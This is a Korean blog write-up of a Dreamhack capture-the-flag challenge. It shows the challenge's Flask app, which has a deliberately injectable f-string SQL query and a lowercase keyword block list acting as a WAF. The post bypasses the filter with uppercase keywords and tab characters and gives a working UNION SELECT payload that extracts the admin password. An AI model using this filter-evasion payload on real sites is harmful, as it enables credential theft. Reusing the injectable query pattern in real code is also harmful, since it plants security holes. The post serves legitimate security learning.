---
title: (8) Dreamhack sql injection bypass WAF 문제 풀이
date: 2024-01-12 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 풀이
사이트에 들어가면 이렇게 생겼습니다.
![](http://kyuyeop.github.io/assets/img/post/8/1.png)
먼저 init.sql입니다.
```sql
# init.sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```
이걸 실행하면 db에 아래와 같은 데이터가 생길겁니다.
{% endraw %}
|idx|uid|upw|
|:---:|:---:|:---:|
|0|abcde|12345|
|1|admin|DH\{...\}|
|2|guest|guest|
|3|test|test|
|4|dream|hack|
{% raw %}
일단 admin을 넣어봅시다.
![](http://kyuyeop.github.io/assets/img/post/8/2.png)
막혔다고 뜹니다. 다른 값은 어떤지 보겠습니다. guest를 넣으면
![](http://kyuyeop.github.io/assets/img/post/8/3.png)
guest가 출력됩니다.  
  
어떤 로직으로 돌아가는지 확인해 보겠습니다.
```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
코드를 보면 일부 문자열을 필터링하고 있는데, 전부 소문자만 필터링하는점, 그리고 \\t 즉 탭을 막고 있지 않다는 점이 눈에 띄네요. 스페이스를 필터링하므로 탭을 대신 사용해야 합니다. 참고로 \*이나 /를 막지 않고 있다면 주석 구문인 /\*\*/를 이용하면 스페이스를 대신할 수 있니다.  
  
그럼 바로 공격 구문을 짜 봅시다.
```
' UNION SELECT  null,upw,null FROM  user  LIMIT 1,1#
```
앞쪽 결과는 중요하지 않으니 아무값도 넘겨주지 않고요, union을 이용해서 뒤에 있는 구문만 살렸습니다.  
admin을 막고 있으니 limit 1,1을 이용해 admin을 선택해 주었습니다. 그리고 중요한 점은 모든 공백은 탭 입니다.

여기서 조심할 부분이 또 있는데, 바로 null,upw,null 부분입니다.  
union을 사용할때 앞 sql문의 반환값과 뒤 sql문의 column 수가 같아야 에러가 안납니다.  
저 코드를 uid에 넣고 실행하면
![](http://kyuyeop.github.io/assets/img/post/8/4.png)
flag가 출력됩니다.
{% endraw %}